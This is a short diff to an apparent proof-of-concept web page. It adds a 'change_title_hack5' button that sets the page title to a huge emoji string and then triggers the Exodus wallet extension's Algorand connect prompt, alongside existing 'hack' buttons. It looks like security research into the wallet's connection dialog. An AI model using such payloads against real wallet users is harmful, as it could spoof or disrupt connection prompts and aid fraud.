@@ -29,6 +29,12 @@
                 window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
             }
 
+            function change_title_hack5() {
+                var payload = '\uD83D\uDC04'.repeat(10000);
+                //console.log("[*] " + payload);
+                document.title = payload;
+                window.exodus.algorand.connect();
+            }
             
         </script>
         <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #3A6">
@@ -40,6 +46,7 @@
         <input type="button" value="hack2" onclick="hack2()" />
         <input type="button" value="hack3" onclick="hack3()" />
         <input type="button" value="hack4" onclick="hack4()" />
+        <input type="button" value="change_title_hack5" onclick="change_title_hack5()" />
         </div>
     </body>
 </html>
